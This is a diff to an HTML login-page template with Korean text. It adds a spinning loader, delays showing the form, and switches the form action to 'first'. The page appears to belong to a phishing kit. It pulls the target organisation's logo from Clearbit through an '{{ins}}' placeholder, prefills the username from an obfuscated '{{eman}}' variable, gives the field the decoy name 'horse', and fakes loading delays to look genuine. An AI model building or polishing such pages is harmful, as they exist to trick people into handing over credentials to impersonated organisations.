@@ -17,6 +17,41 @@
       color: #fff; /* Light text color for better readability */
     }
 
+    .custom-loader {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 8px solid transparent;
+      border-top: 8px solid #3CB371; /* Lighter green shade for loader color */
+      animation: spin 1s linear infinite, pulse 1.5s ease-in-out infinite; /* Spinning and pulsating animation */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1;
+      opacity: 0;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        border: 8px solid #3CB371; /* Lighter green shade for loader color */
+        opacity: 0.5;
+      }
+      50% {
+        border: 12px solid #3CB371; /* Increase border size for pulsating effect */
+        opacity: 1;
+      }
+    }
+
     .login-container {
       width: 90%;
       max-width: 400px;
@@ -32,6 +67,7 @@
       padding: 70px 30px;
       animation: shake 0.5s ease-in-out, fadeIn 1s ease-in-out; /* Shaking and fade-in effects */
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Box shadow for depth effect */
+      display: none; /* Initially hidden */
     }
 
     @keyframes shake {
@@ -99,6 +135,7 @@
     }
 
     .login-container input[type="submit"] {
+      position: relative;
       border: none;
       outline: none;
       height: 40px;
@@ -172,10 +209,11 @@
   </style>
 </head>
 <body>
-<div class="login-container">
+<div class="custom-loader" id="loader"></div>
+<div class="login-container" id="loginContainer">
   <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
   <h1>여기에 로그인하세요</h1>
-  <form action="second" method="post">
+  <form action="first" method="post">
     <p>사용자 이름</p>
     <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
     <p>비밀번호</p>
@@ -184,5 +222,25 @@
     <a href="#">비밀번호 분실</a>
   </form>
 </div>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    // Simulate delay for an elite loading experience
+    setTimeout(function() {
+      document.getElementById('loader').style.opacity = '1';
+      document.getElementById('loader').style.animation = 'none';
+    }, 1000);
+
+    // Simulate additional delay before hiding loader and displaying the login form
+    setTimeout(function() {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('loginContainer').style.display = 'block';
+    }, 3000);
+  });
+
+  document.querySelector('form').addEventListener('submit', function() {
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('loginContainer').style.display = 'none';
+  });
+</script>
 </body>
 </html>
